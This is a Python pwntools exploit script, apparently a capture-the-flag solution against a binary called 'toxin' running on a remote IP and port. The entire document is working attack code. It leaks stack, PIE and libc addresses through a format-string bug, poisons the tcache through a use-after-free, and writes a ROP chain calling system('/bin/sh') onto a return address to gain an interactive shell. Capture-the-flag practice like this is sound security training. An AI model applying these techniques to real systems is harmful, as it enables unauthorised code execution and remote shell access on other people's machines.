#!/usr/bin/env python3
from pwn import *

DUMMY = 0xdeadbeefdeadbeef
QWORD = 8

ld = ELF("./given/ld-2.27.so")
elf = ELF("./given/toxin")
libc = ELF("./given/libc.so.6")

context.arch = elf.arch
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote("165.22.113.109", 32668)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"given/toxin" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        assert(pie_base is not None)
        log.info(f"PIE: {hex(pie_base)}")
        log.info(f"toxins: {hex(pie_base + 0x4060)}")
        gdb.attach(p, "\n".join([
            #f"b *{hex(pie_base + 0x128d)}", # invalid option
            f"b *{hex(pie_base + 0x1451)}", # add_toxin's ret
        ]))

def add_toxin(size, index, content):
    p.sendlineafter(b"Enter your lab code.\n> ", b"1")
    p.sendlineafter(b"Toxin chemical formula length: ", str(size).encode())
    p.sendlineafter(b"Toxin index: ", str(index).encode())
    p.sendafter(b"Enter toxin formula: ", content)
    return index

def edit_toxin(index, content):
    p.sendlineafter(b"Enter your lab code.\n> ", b"2")
    p.sendlineafter(b"Toxin index: ", str(index).encode())
    p.sendafter(b"Enter toxin formula: ", content)

def free_toxin(index):
    p.sendlineafter(b"Enter your lab code.\n> ", b"3")
    p.sendlineafter(b"Toxin index: ", str(index).encode())

def search_toxin(pattern):
    p.sendlineafter(b"Enter your lab code.\n> ", b"4")
    p.sendafter(b"Enter search term: ", pattern)
    return p.recvline()


def tcache_poison():
    req_size = 0xe0
    a = add_toxin(req_size, 0, p64(DUMMY))
    b = add_toxin(req_size, 1, p64(DUMMY))
    free_toxin(a)
    free_toxin(b)

def search_leak():
    for i in range(0, 22):
        x = search_toxin(f"%{i}$p".encode())
        log.info(f"{i}: {x}")


def leak_stack():
    leak = search_toxin(b"%8$p")
    rbp = int(leak.split(b" ")[0], 16)
    log.info(f"found rbp: {hex(rbp)}")
    return rbp

def leak_pie():
    leak = search_toxin(b"%9$p")
    pie_addr = int(leak.split(b" ")[0], 16)
    log.info(f"found pie addr: {hex(pie_addr)}")
    return pie_addr

def leak_libc():
    leak = search_toxin(b"%13$p")
    libc_addr = int(leak.split(b" ")[0], 16)
    log.info(f"found libc addr: {hex(libc_addr)}")
    return libc_addr

def tcache_poison(addr, value):
    req_size = 0xe0
    a = add_toxin(req_size, 0, p64(DUMMY))
    free_toxin(a)
    edit_toxin(a, p64(addr))
    add_toxin(req_size, 1, p64(DUMMY))
    add_toxin(req_size, 2, value)

def exploit():
    # this will be mains RBP
    stack_rbp_main = leak_stack()
    elf.address = leak_pie() - 0x1284
    log.info(f"elf base: {hex(elf.address)}")
    libc.address = leak_libc() - 0x21b97
    log.info(f"libc base: {hex(libc.address)}")

    pop_rdi = libc.address + 0x2155f
    ret = libc.address + 0x21560
    payload = p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.sym["system"])

    # objdump to know the offset
    stack_addtoxin_retaddr = stack_rbp_main - 0x10 - QWORD
    tcache_poison(stack_addtoxin_retaddr, payload)

    p.interactive()

if __name__ == "__main__":
    exploit()
